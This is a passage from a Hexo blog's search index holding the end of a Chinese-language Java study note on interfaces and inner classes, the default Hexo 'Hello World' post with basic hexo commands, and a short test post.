#E06C75"> </span><span style="color: #E5C07B">UserServiceImpl</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UserService</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TimeService</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> add</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> delete</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> update</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> query</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> timer</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li></ul><p>作用：</p><ol><li>约束</li><li>定义一些方法，让不同的人实现    10——-1</li><li>public abstract    （）</li><li>public static final    （常量）</li><li>接口不能被实例化<del>，接口中没有构造方法</del></li><li>implements可以实现多个接日</li><li>必须要重写接口中的方法~</li></ol><h2 id="内部类（选）"><a href="#内部类（选）" class="headerlink" title="内部类（选）"></a>内部类（选）</h2><ul><li><p>成员内部类</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125618721.png" alt="image-20251025201724763"></p><p>而且，可以通过<strong>内部类</strong>来获得<strong>外部类的私有属性</strong>（private）</p><p>但是，如果在内部类上加static，就访问不了私有属性</p><p>因为：先实例化static内部类，才有外部类实例化，static内部类直接运行调用不到私有属性</p></li><li><p>两个类可以在一个文件里面（不是互相包含的）</p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125623584.png" alt="image-20251025202950608" style="zoom:33%;" /><p>一个文件只能有一个public class</p></li><li><p>局部内部类</p><p>方法里 写类</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125625249.png" alt="image-20251025203107344"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/12/22/hello-world/"/>
    <url>/2024/12/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">$</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hexo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">new</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;My New Post&quot;</span></span></code></pre></div></div></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">$</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hexo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">server</span></span></code></pre></div></div></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">$</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hexo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">generate</span></span></code></pre></div></div></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">$</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hexo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deploy</span></span></code></pre></div></div></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>这是一篇测试文章</p><img src="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png" class="" title="图片引用方法一">]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
